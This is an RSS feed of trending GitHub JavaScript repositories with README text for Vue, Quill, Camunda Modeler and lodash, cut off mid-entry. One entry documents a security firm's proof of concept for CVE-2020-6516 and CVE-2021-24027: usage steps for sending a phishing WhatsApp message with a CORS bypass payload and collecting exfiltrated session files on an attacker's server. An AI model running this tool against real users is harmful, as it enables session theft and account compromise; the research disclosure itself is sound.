<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>GitHub JavaScript Daily Trending</title>
    <description>Daily Trending of JavaScript in GitHub</description>
    <pubDate>Sat, 17 Apr 2021 01:56:03 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>vuejs/vue</title>
      <link>https://github.com/vuejs/vue</link>
      <description>&lt;p&gt;üññ Vue.js is a progressive, incrementally-adoptable JavaScript framework for building UI on the web.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Vue.js is an MIT-licensed open source project with its ongoing development made possible entirely by the support of these awesome &lt;a href=&quot;https://github.com/vuejs/vue/blob/dev/BACKERS.md&quot;&gt;backers&lt;/a&gt;. If you&#39;d like to join them, please consider:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.patreon.com/evanyou&quot;&gt;Become a backer or sponsor on Patreon&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://opencollective.com/vuejs&quot;&gt;Become a backer or sponsor on Open Collective&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://vuejs.org/support-vuejs/#One-time-Donations&quot;&gt;One-time donation via PayPal or crypto-currencies.&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;What&#39;s the difference between Patreon and OpenCollective?&lt;/h4&gt; 
&lt;p&gt;Funds donated via Patreon go directly to support Evan You&#39;s full-time work on Vue.js. Funds donated via OpenCollective are managed with transparent expenses and will be used for compensating work and expenses for core team members or sponsoring community events. Your name/logo will receive proper recognition and exposure by donating on either platform.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;Vue (pronounced &lt;code&gt;/vjuÀê/&lt;/code&gt;, like view) is a &lt;strong&gt;progressive framework&lt;/strong&gt; for building user interfaces. It is designed from the ground up to be incrementally adoptable, and can easily scale between a library and a framework depending on different use cases. It consists of an approachable core library that focuses on the view layer only, and an ecosystem of supporting libraries that helps you tackle complexity in large Single-Page Applications.&lt;/p&gt; 
&lt;h4&gt;Browser Compatibility&lt;/h4&gt; 
&lt;p&gt;Vue.js supports all browsers that are &lt;a href=&quot;https://kangax.github.io/compat-table/es5/&quot;&gt;ES5-compliant&lt;/a&gt; (IE8 and below are not supported).&lt;/p&gt; 
&lt;h2&gt;Ecosystem&lt;/h2&gt; 
&lt;p&gt;| Project | Status | Description | |---------|--------|-------------| | &lt;a href=&quot;https://github.com/vuejs/vue-router&quot;&gt;vue-router&lt;/a&gt; | &lt;a href=&quot;https://npmjs.com/package/vue-router&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/vue-router.svg&quot; alt=&quot;vue-router-status&quot;&gt;&lt;/a&gt; | Single-page application routing | | &lt;a href=&quot;https://github.com/vuejs/vuex&quot;&gt;vuex&lt;/a&gt; | &lt;a href=&quot;https://npmjs.com/package/vuex&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/vuex.svg&quot; alt=&quot;vuex-status&quot;&gt;&lt;/a&gt; | Large-scale state management | | &lt;a href=&quot;https://github.com/vuejs/vue-cli&quot;&gt;vue-cli&lt;/a&gt; | &lt;a href=&quot;https://npmjs.com/package/@vue/cli&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/@vue/cli.svg&quot; alt=&quot;vue-cli-status&quot;&gt;&lt;/a&gt; | Project scaffolding | | &lt;a href=&quot;https://github.com/vuejs/vue-loader&quot;&gt;vue-loader&lt;/a&gt; | &lt;a href=&quot;https://npmjs.com/package/vue-loader&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/vue-loader.svg&quot; alt=&quot;vue-loader-status&quot;&gt;&lt;/a&gt; | Single File Component (&lt;code&gt;*.vue&lt;/code&gt; file) loader for webpack | | &lt;a href=&quot;https://github.com/vuejs/vue/tree/dev/packages/vue-server-renderer&quot;&gt;vue-server-renderer&lt;/a&gt; | &lt;a href=&quot;https://npmjs.com/package/vue-server-renderer&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/vue-server-renderer.svg&quot; alt=&quot;vue-server-renderer-status&quot;&gt;&lt;/a&gt; | Server-side rendering support | | &lt;a href=&quot;https://github.com/vuejs/vue-class-component&quot;&gt;vue-class-component&lt;/a&gt; | &lt;a href=&quot;https://npmjs.com/package/vue-class-component&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/vue-class-component.svg&quot; alt=&quot;vue-class-component-status&quot;&gt;&lt;/a&gt; | TypeScript decorator for a class-based API | | &lt;a href=&quot;https://github.com/vuejs/vue-rx&quot;&gt;vue-rx&lt;/a&gt; | &lt;a href=&quot;https://npmjs.com/package/vue-rx&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/vue-rx.svg&quot; alt=&quot;vue-rx-status&quot;&gt;&lt;/a&gt; | RxJS integration | | &lt;a href=&quot;https://github.com/vuejs/vue-devtools&quot;&gt;vue-devtools&lt;/a&gt; | &lt;a href=&quot;https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd&quot;&gt;&lt;img src=&quot;https://img.shields.io/chrome-web-store/v/nhdogjmejiglipccpnnnanhbledajbpd.svg&quot; alt=&quot;vue-devtools-status&quot;&gt;&lt;/a&gt; | Browser DevTools extension |&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;To check out &lt;a href=&quot;https://vuejs.org/v2/examples/&quot;&gt;live examples&lt;/a&gt; and docs, visit &lt;a href=&quot;https://vuejs.org&quot;&gt;vuejs.org&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Questions&lt;/h2&gt; 
&lt;p&gt;For questions and support please use &lt;a href=&quot;https://forum.vuejs.org&quot;&gt;the official forum&lt;/a&gt; or &lt;a href=&quot;https://chat.vuejs.org/&quot;&gt;community chat&lt;/a&gt;. The issue list of this repo is &lt;strong&gt;exclusively&lt;/strong&gt; for bug reports and feature requests.&lt;/p&gt; 
&lt;h2&gt;Issues&lt;/h2&gt; 
&lt;p&gt;Please make sure to read the &lt;a href=&quot;https://github.com/vuejs/vue/blob/dev/.github/CONTRIBUTING.md#issue-reporting-guidelines&quot;&gt;Issue Reporting Checklist&lt;/a&gt; before opening an issue. Issues not conforming to the guidelines may be closed immediately.&lt;/p&gt; 
&lt;h2&gt;Changelog&lt;/h2&gt; 
&lt;p&gt;Detailed changes for each release are documented in the &lt;a href=&quot;https://github.com/vuejs/vue/releases&quot;&gt;release notes&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Stay In Touch&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://twitter.com/vuejs&quot;&gt;Twitter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://medium.com/the-vue-point&quot;&gt;Blog&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://vuejobs.com/?ref=vuejs&quot;&gt;Job Board&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Contribution&lt;/h2&gt; 
&lt;p&gt;Please make sure to read the &lt;a href=&quot;https://github.com/vuejs/vue/blob/dev/.github/CONTRIBUTING.md&quot;&gt;Contributing Guide&lt;/a&gt; before making a pull request. If you have a Vue-related project/component/tool, add it with a pull request to &lt;a href=&quot;https://github.com/vuejs/awesome-vue&quot;&gt;this curated list&lt;/a&gt;!&lt;/p&gt; 
&lt;p&gt;Thank you to all the people who already contributed to Vue!&lt;/p&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://opensource.org/licenses/MIT&quot;&gt;MIT&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Copyright (c) 2013-present, Yuxi (Evan) You&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>quilljs/quill</title>
      <link>https://github.com/quilljs/quill</link>
      <description>&lt;p&gt;Quill is a modern WYSIWYG editor built for compatibility and extensibility.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Note: This branch and README covers the upcoming 2.0 release. View &lt;a href=&quot;https://github.com/quilljs/quill/tree/1.3.6&quot;&gt;1.x docs here&lt;/a&gt;.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;a href=&quot;https://quilljs.com/&quot;&gt;Quill&lt;/a&gt; is a modern rich text editor built for compatibility and extensibility. It was created by &lt;a href=&quot;https://twitter.com/jhchen&quot;&gt;Jason Chen&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/byronmilligan&quot;&gt;Byron Milligan&lt;/a&gt; and actively maintained by &lt;a href=&quot;https://slab.com&quot;&gt;Slab&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To get started, check out &lt;a href=&quot;https://quilljs.com/&quot;&gt;https://quilljs.com/&lt;/a&gt; for documentation, guides, and live demos!&lt;/p&gt; 
&lt;h2&gt;Quickstart&lt;/h2&gt; 
&lt;p&gt;Instantiate a new Quill object with a css selector for the div that should become the editor.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!-- Include Quill stylesheet --&amp;gt;
&amp;lt;link href=&quot;https://cdn.quilljs.com/1.0.0/quill.snow.css&quot; rel=&quot;stylesheet&quot;&amp;gt;

&amp;lt;!-- Create the toolbar container --&amp;gt;
&amp;lt;div id=&quot;toolbar&quot;&amp;gt;
  &amp;lt;button class=&quot;ql-bold&quot;&amp;gt;Bold&amp;lt;/button&amp;gt;
  &amp;lt;button class=&quot;ql-italic&quot;&amp;gt;Italic&amp;lt;/button&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;!-- Create the editor container --&amp;gt;
&amp;lt;div id=&quot;editor&quot;&amp;gt;
  &amp;lt;p&amp;gt;Hello World!&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;!-- Include the Quill library --&amp;gt;
&amp;lt;script src=&quot;https://cdn.quilljs.com/1.0.0/quill.js&quot;&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;!-- Initialize Quill editor --&amp;gt;
&amp;lt;script&amp;gt;
  var editor = new Quill(&#39;#editor&#39;, {
    modules: { toolbar: &#39;#toolbar&#39; },
    theme: &#39;snow&#39;
  });
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Take a look at the &lt;a href=&quot;https://quilljs.com/&quot;&gt;Quill&lt;/a&gt; website for more documentation, guides and &lt;a href=&quot;https://quilljs.com/playground/&quot;&gt;live playground&lt;/a&gt;!&lt;/p&gt; 
&lt;h2&gt;Download&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.npmjs.com/package/quill&quot;&gt;npm&lt;/a&gt; - &lt;code&gt;npm install quill&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;tar - https://github.com/quilljs/quill/releases&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;CDN&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!-- Main Quill library --&amp;gt;
&amp;lt;script src=&quot;//cdn.quilljs.com/1.0.0/quill.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&quot;//cdn.quilljs.com/1.0.0/quill.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;!-- Theme included stylesheets --&amp;gt;
&amp;lt;link href=&quot;//cdn.quilljs.com/1.0.0/quill.snow.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
&amp;lt;link href=&quot;//cdn.quilljs.com/1.0.0/quill.bubble.css&quot; rel=&quot;stylesheet&quot;&amp;gt;

&amp;lt;!-- Core build with no theme, formatting, non-essential modules --&amp;gt;
&amp;lt;link href=&quot;//cdn.quilljs.com/1.0.0/quill.core.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
&amp;lt;script src=&quot;//cdn.quilljs.com/1.0.0/quill.core.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Community&lt;/h2&gt; 
&lt;p&gt;Get help or stay up to date.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/quilljs/quill/blob/develop/.github/CONTRIBUTING.md&quot;&gt;Contribute&lt;/a&gt; on &lt;a href=&quot;https://github.com/quilljs/quill/issues&quot;&gt;Issues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Follow &lt;a href=&quot;https://twitter.com/jhchen&quot;&gt;@jhchen&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/quilljs&quot;&gt;@quilljs&lt;/a&gt; on Twitter&lt;/li&gt; 
 &lt;li&gt;Ask questions on &lt;a href=&quot;https://stackoverflow.com/questions/tagged/quill&quot;&gt;Stack Overflow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;If privacy is required, email support@quilljs.com&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;BSD 3-clause&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>CENSUS/whatsapp-mitd-mitm</title>
      <link>https://github.com/CENSUS/whatsapp-mitd-mitm</link>
      <description>&lt;p&gt;PoC and tools for exploiting CVE-2020-6516 (Chrome) and CVE-2021-24027 (WhatsApp)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;WhatsApp MitD &amp;amp; MitM&lt;/h1&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;This repository contains PoC code and tools that were developed as part of our research [01] on remotely exploiting &lt;em&gt;Man-in-the-Disk&lt;/em&gt; (MitD) vulnerabilities on WhatsApp for Android. As discussed in our blog post, the code and accompanying scripts found here, were used to exploit CVE-2020-6516 (Chrome) [02] and CVE-2021-24027 (WhatsApp) [03].&lt;/p&gt; 
&lt;p&gt;The structure of this repository is as follows:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;The current directory contains the Python tool that hooks WhatsApp using Frida, sends the phishing message carrying the CORS bypass payload and runs an HTTP server, where exfiltrated session files from the victim device are sent to.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;tls12_psk_extract/&lt;/strong&gt; contains the TLS v1.2 MitM toolset. See &lt;strong&gt;README.md&lt;/strong&gt; in that directory for more information on how to prepare a MitM environment.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;watls_psk_extract/&lt;/strong&gt; contains the TLS v1.3 (WaTLS) MitM toolset. See &lt;strong&gt;README.md&lt;/strong&gt; in that directory for more information on how to prepare a MitM environment.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;openssl-1.1.1f-patches/&lt;/strong&gt; contains OpenSSL 1.1.1f patches required for setting up TLS v1.2 and/or TLS v1.3 MitM environments.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;secrets/&lt;/strong&gt; holds a simple shell script and an OpenSSL configuration for generating certificates similar to those used by the WhatsApp TLS v1.3 infrastructure. The generated keys and certificates can be used for both TLS v1.2 and v1.3 MitM.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Last but not least, &lt;strong&gt;misc/&lt;/strong&gt; contains various Frida scripts that were used for testing and debugging purposes during our research and might be helpful to other researchers.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;p&gt;To test the PoC you need an Android device running WhatsApp 2.20.206.22 [04]. Even though our code was initially developed for 2.19.355, and so you can find the corresponding snippets under &lt;strong&gt;frida_scripts/&lt;/strong&gt;, that version is nowadays considered &quot;expired&quot; and won&#39;t work.&lt;/p&gt; 
&lt;p&gt;Before firing up the PoC, it is a good idea to compile as little as possible of WhatsApp&#39;s DEX code. Doing so might proactively help in avoiding issues like Frida not being able to hook specific methods.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;adb shell
am force-stop com.whatsapp
pm compile -f -m space com.whatsapp
am start com.whatsapp/.Main
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Download Frida server and push it on your Android device under &lt;strong&gt;/data/local/tmp&lt;/strong&gt;, leaving the default file name as is. Version 12.8.10 is tested and known to work well. Feel free to download a more recent one if you prefer to. The PoC will automatically detect the Frida server binary and will attempt to execute it with the appropriate command line arguments.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;cd /tmp
curl -O https://github.com/frida/frida/releases/download/12.8.10/frida-server-12.8.10-android-arm64.xz
xz -d frida-server-12.8.10-android-arm64.xz
adb push frida-server-12.8.10-android-arm64 /data/local/tmp
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The main logic of the exploit is implemented in &lt;strong&gt;main.py&lt;/strong&gt;. Files &lt;strong&gt;adb.py&lt;/strong&gt; and &lt;strong&gt;frida_util.py&lt;/strong&gt; are trimmed down versions of tools that we use internally for various debugging tasks on Android devices.&lt;/p&gt; 
&lt;p&gt;To run the PoC, attach your Android device on your computer and run the following command:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;python3 main.py -s ANDROID_SERIAL -a 192.168.1.100 -p 8000 -r \
    images/the_guardian.jpg MOBILE_NUMBER@s.whatsapp.net &quot;Rush for Mediterranean gas&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The command line switches passed to &lt;strong&gt;main.py&lt;/strong&gt; are the following:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;-s&lt;/code&gt; - The serial number of the Android device to use, in case the attacker has multiple Android devices attached on her computer.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;-a&lt;/code&gt; and &lt;code&gt;-p&lt;/code&gt; - Address and port, respectively, of the HTTP server where the exfiltrated sessions will be sent to.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;-r&lt;/code&gt; - Instructs &lt;strong&gt;main.py&lt;/strong&gt; to start the aforementioned HTTP server on the local computer. If you don&#39;t pass &lt;code&gt;-r&lt;/code&gt;, make sure you run &lt;strong&gt;server.py&lt;/strong&gt; on the host specified by &lt;code&gt;-a&lt;/code&gt; and &lt;code&gt;-p&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Positional arguments are the following:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;images/guardian.jpg&lt;/strong&gt; - A JPG image that will be used as a fake message preview, in order to lure the victim into clicking on it.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;MOBILE_NUMBER@s.whatsapp.net&lt;/strong&gt; - The victim&#39;s mobile phone number in WhatsApp format. This is usually the country prefix followed by the mobile number. For example, Greek numbers (+30) look like &lt;code&gt;301234567890@s.whatsapp.net&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&quot;Rush for Mediterranean gas&quot;&lt;/strong&gt; - An arbitrary string to be used as the message caption.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For a real life usage example, have a look at our blog post, and more specifically at the demonstration videos.&lt;/p&gt; 
&lt;h2&gt;References&lt;/h2&gt; 
&lt;p&gt;[01] &lt;a href=&quot;https://census-labs.com/news/2021/03/07/whatsapp-mitd-remote-exploitation-CVE-2021-24027/&quot;&gt;https://census-labs.com/news/2021/03/07/whatsapp-mitd-remote-exploitation-CVE-2021-24027/&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;[02] &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;[03] &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24027&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24027&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;[04] &lt;a href=&quot;https://www.apkmirror.com/apk/whatsapp-inc/whatsapp/whatsapp-2-20-206-22-release/whatsapp-messenger-2-20-206-22-android-apk-download/&quot;&gt;https://www.apkmirror.com/apk/whatsapp-inc/whatsapp/whatsapp-2-20-206-22-release/whatsapp-messenger-2-20-206-22-android-apk-download/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>camunda/camunda-modeler</title>
      <link>https://github.com/camunda/camunda-modeler</link>
      <description>&lt;p&gt;An integrated modeling solution for BPMN and DMN based on bpmn.io.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Camunda Modeler&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://travis-ci.com/camunda/camunda-modeler&quot;&gt;&lt;img src=&quot;https://travis-ci.com/camunda/camunda-modeler.svg?branch=develop&quot; alt=&quot;Build Status&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An integrated modeling solution for BPMN and DMN based on &lt;a href=&quot;http://bpmn.io&quot;&gt;bpmn.io&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/camunda/camunda-modeler/develop/docs/screenshot.png&quot; alt=&quot;Camunda Modeler&quot;&gt;&lt;/p&gt; 
&lt;h2&gt;Resources&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/camunda/camunda-modeler/develop/CHANGELOG.md&quot;&gt;Changelog&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://camunda.com/download/modeler/&quot;&gt;Download&lt;/a&gt; (see also &lt;a href=&quot;https://downloads.camunda.cloud/release/camunda-modeler/nightly/&quot;&gt;nightly builds&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://forum.camunda.org/c/modeler&quot;&gt;Give Feedback&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/camunda/camunda-modeler/issues&quot;&gt;Report a Bug&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://docs.camunda.org/manual/latest/modeler/camunda-modeler/&quot;&gt;User Documentation&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Building the Application&lt;/h2&gt; 
&lt;p&gt;Build the app in a Posix environment. On Windows that is Git Bash or WSL.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;# checkout a tag
git checkout v1.1.0

# install dependencies
npm install

# execute all checks (lint, test and build)
npm run all

# build the application to ./dist
npm run build
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Development Setup&lt;/h3&gt; 
&lt;p&gt;Spin up the application for development, all strings attached:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;npm run dev
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;Please checkout our &lt;a href=&quot;https://raw.githubusercontent.com/camunda/camunda-modeler/develop/.github/CONTRIBUTING.md&quot;&gt;contributing guidelines&lt;/a&gt; if you plan to file an issue or pull request.&lt;/p&gt; 
&lt;h2&gt;Code of Conduct&lt;/h2&gt; 
&lt;p&gt;By participating to this project, please uphold to our &lt;a href=&quot;https://github.com/camunda/.github/blob/main/.github/CODE_OF_CONDUCT.md&quot;&gt;Code of Conduct&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;MIT&lt;/p&gt; 
&lt;p&gt;Uses &lt;a href=&quot;https://github.com/bpmn-io/bpmn-js&quot;&gt;bpmn-js&lt;/a&gt;, &lt;a href=&quot;https://github.com/bpmn-io/dmn-js&quot;&gt;dmn-js&lt;/a&gt;, and &lt;a href=&quot;https://github.com/bpmn-io/cmmn-js&quot;&gt;cmmn-js&lt;/a&gt;, licensed under the &lt;a href=&quot;http://bpmn.io/license&quot;&gt;bpmn.io license&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>lodash/lodash</title>
      <link>https://github.com/lodash/lodash</link>
      <description>&lt;p&gt;A modern JavaScript utility library delivering modularity, performance, &amp; extras.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;lodash&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://lodash.com/&quot;&gt;Site&lt;/a&gt; | &lt;a href=&quot;https://lodash.com/docs&quot;&gt;Docs&lt;/a&gt; | &lt;a href=&quot;https://github.com/lodash/lodash/wiki/FP-Guide&quot;&gt;FP Guide&lt;/a&gt; | &lt;a href=&quot;https://github.com/lodash/lodash/blob/master/.github/CONTRIBUTING.md&quot;&gt;Contributing&lt;/a&gt; | &lt;a href=&quot;https://github.com/lodash/lodash/wiki&quot; title=&quot;Changelog, Roadmap, etc.&quot;&gt;Wiki&lt;/a&gt; | &lt;a href=&quot;https://code-of-conduct.openjsf.org&quot;&gt;Code of Conduct&lt;/a&gt; | &lt;a href=&quot;https://twitter.com/bestiejs&quot;&gt;Twitter&lt;/a&gt; | &lt;a href=&quot;https://gitter.im/lodash/lodash&quot;&gt;Chat&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;The &lt;a href=&quot;https://lodash.com/&quot;&gt;Lodash&lt;/a&gt; library exported as a &lt;a href=&quot;https://github.com/umdjs/umd&quot;&gt;UMD&lt;/a&gt; module.&lt;/p&gt; 
&lt;p&gt;Generated using &lt;a href=&quot;https://www.npmjs.com/package/lodash-cli&quot;&gt;lodash-cli&lt;/a&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ npm run build
$ lodash -o ./dist/lodash.js
$ lodash core -o ./dist/lodash.core.js
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Download&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/lodash/lodash/4.17.10-npm/core.js&quot;&gt;Core build&lt;/a&gt; (&lt;a href=&quot;https://raw.githubusercontent.com/lodash/lodash/4.17.10-npm/core.min.js&quot;&gt;~4 kB gzipped&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/lodash/lodash/4.17.10-npm/lodash.js&quot;&gt;Full build&lt;/a&gt; (&lt;a href=&quot;https://raw.githubusercontent.com/lodash/lodash/4.17.10-npm/lodash.min.js&quot;&gt;~24 kB gzipped&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.jsdelivr.com/projects/lodash&quot;&gt;CDN copies&lt;/a&gt; &lt;a href=&quot;https://www.jsdelivr.com/package/npm/lodash&quot;&gt;&lt;img src=&quot;https://data.jsdelivr.com/v1/package/npm/lodash/badge&quot; alt=&quot;jsDelivr Hits&quot;&gt;&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Lodash is released under the &lt;a href=&quot;https://raw.githubusercontent.com/lodash/lodash/4.17.10-npm/LICENSE&quot;&gt;MIT license&lt;/a&gt; &amp;amp; supports modern environments.
 &lt;!-- raw HTML omitted --&gt; Review the &lt;a href=&quot;https://github.com/lodash/lodash/wiki/build-differences&quot;&gt;build differences&lt;/a&gt; &amp;amp; pick one that‚Äôs right for you.&lt;/p&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;In a browser:&lt;/p&gt; 
